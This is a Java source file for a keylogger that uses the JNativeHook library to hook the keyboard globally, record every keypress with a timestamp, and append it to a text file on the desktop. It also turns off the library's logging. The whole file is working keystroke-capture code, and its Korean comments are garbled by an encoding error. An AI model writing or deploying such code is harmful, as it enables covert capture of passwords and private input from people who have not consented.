// GUI �߰� �� ����ȿ�� ���� �ʿ� (Still implementing...)
//-------------------------------------------------
// import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter; // for File Writer
//-------------------------------------------------
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class JavaNativeHook_keylogger implements NativeKeyListener {
	@Override
	public void nativeKeyPressed(NativeKeyEvent arg0) {
		//+++++++++++++++++++++++++++Time & DateFormat ++++++++++++++++++++++++++++++
		SimpleDateFormat format1 = new SimpleDateFormat ( "YYYY-MM-dd HH:mm:ss" );
		
		Date time = new Date();
				
		String time1 = "{"+format1.format(time)+"}"; //�ð�ó��
		//+++++++++++++++++++++++++++++++++++++++++++++=====+++++++++++++++++++++++++
		
		String st = "["+NativeKeyEvent.getKeyText(arg0.getKeyCode()).toLowerCase()+"]";
		switch(st) {
		case "space":
			st = st.replace("space", " ");
			break;
		case "ctrl":
			st = st.replace("ctrl","[CTRL]");
			break;
		case "meta":
			st = st.replace("meta","[������Ű]");
			break;
		case "alt":
			st = st.replace("alt","[ALT]");
			break;
		case "delete":
			st = st.replace("delete","[DELETE]");
			break;
		case "backspace":
			st = st.replace("backspace","[BS]");
			break;
		case "shift":
			st = st.replace("shift", "^");
			break;
		case "tab":
			st = st.replace("tab","[TAB]");
			break;
		case "enter":
			st = st.replace("enter","[ENTER]");
			break;
		case "��Ÿī��":
			st = st.replace("��Ÿī��","[��/��]");
			break;
		case "caps lock":
			st = st.replace("caps lock","[CAPS LOCK]");
			break;
		case "semicolon":
			st = st.replace("semicolon",";");
			break;
		case "minus":
			st = st.replace("minus","-");
			break;
		case "����":
			st = st.replace("����","[����]");
			break;
		case "period":
			st = st.replace("period",".");
			break;
		case "equals":
			st = st.replace("equals","=");
			break;
		case "quote":
			st = st.replace("quote","`");
			break;
		case "right":
			st = st.replace("right","��");
			break;
		case "left":
			st = st.replace("left","��");
			break;
		case "up":
			st = st.replace("up","��");
			break;
		case "down":
			st = st.replace("down","��");
			break;
		}

    System.out.print(st); //Console printing
	//--------------------for File Writer-------------------------------
    String fileName = "C:\\Users\\admin\\Desktop\\TEST\\test.txt";
    try{
        
        // Create File
        File file = new File(fileName) ;
        // ������ ���� ó��
        FileWriter fwriter = new FileWriter(file, true) ;
        String space="\r\n";
        // Write a string into file
        
        //fwriter.write(time1); //���� �ð� �߰�
        fwriter.write(time1+st+space);
       //fwriter.write(space);
        fwriter.flush();

        fwriter.close();

    }catch(Exception e){
        e.printStackTrace();
    	}
	}
	//-----------------------���� ȿ�� ���� �ʿ�-------------------------------
	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) { }
	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) { }
	
	
	
	public static void main(String args[]) {
        LogManager.getLogManager().reset();
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		
		logger.setLevel(Level.OFF);
		
		try {
			GlobalScreen.registerNativeHook();
		} catch(Exception e) {
			System.out.println("Error : "+e);
		}
		
		GlobalScreen.addNativeKeyListener(new JavaNativeHook_keylogger());
	}	
}

